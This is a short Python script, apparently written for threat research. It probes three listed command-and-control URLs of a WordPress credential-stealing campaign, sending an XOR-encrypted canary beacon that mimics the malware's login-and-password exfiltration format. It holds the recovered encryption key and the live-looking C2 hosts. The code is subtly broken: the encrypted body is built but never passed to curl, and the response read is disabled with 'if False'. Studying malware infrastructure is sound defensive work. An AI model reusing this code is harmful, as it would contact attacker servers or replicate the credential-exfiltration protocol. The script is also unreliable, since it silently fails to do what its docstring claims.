#!/usr/bin/env python3
"""Probe the resolved C2 /w endpoint the same way the malware does,
but read-only: GET + POST with empty/nonce body. XOR-encrypted with the
enc key recovered from the smart contract so the server parses our request
as a legit (but empty) beacon — no real credentials sent."""
import json, subprocess, sys

# C2 enc key extracted from contract getData()
ENC_KEY = bytes.fromhex("33236f30a93bf4da9a985a080f1e93b9")

# Replace with current C2 URLs from getData() resolution
C2S = [
    "https://notion-brown.com/SGct2K",
    "https://gear-carriage.com/SGct2K",
    "https://tape-exposure.com/SGct2K",
]


def xor(b, k):
    return bytes(x ^ k[i % len(k)] for i, x in enumerate(b))


def curl(args):
    # Use YOUR proxy for privacy. Without proxy: remove -x flag.
    r = subprocess.run(["curl", "-s", "--max-time", "25"] + args, capture_output=True)
    return r.stdout, r.stderr


def probe(url):
    print(f"--- {url} ---")
    out, err = curl(["-o", "/dev/null", "-w", "%{http_code} %{size_download}B ct=%{content_type}", url])
    print("GET  :", out.decode(errors="replace"))
    # POST with canary (XOR-encrypted, empty register — no real site)
    payload = json.dumps({
        "loginUrl": "https://COMPROMISEDSITE.TLD/wp-login.php",  # redacted
        "credentials": {"log": "probe-canary", "pwd": "probe-canary"},
        "alive": False
    }).encode()
    body = xor(payload, ENC_KEY)
    out, _ = curl(["-o", "/tmp/c2resp.bin", "-w", "%{http_code} %{size_download}B ct=%{content_type}",
                   "-X", "POST", "-H", "Content-Type: application/octet-stream",
                   "--data-binary", "@-", url + "/w"])
    print("POST /w:", out.decode(errors="replace"))
    resp = open("/tmp/c2resp.bin", "rb").read() if False else b""
    if resp:
        dec = xor(resp, ENC_KEY)
        print("resp hex:", resp[:64].hex())
        print("resp dec:", dec[:200].decode("utf-8", "replace"))
    print()


for u in C2S:
    try:
        probe(u)
    except Exception as e:
        print(u, "ERROR:", e)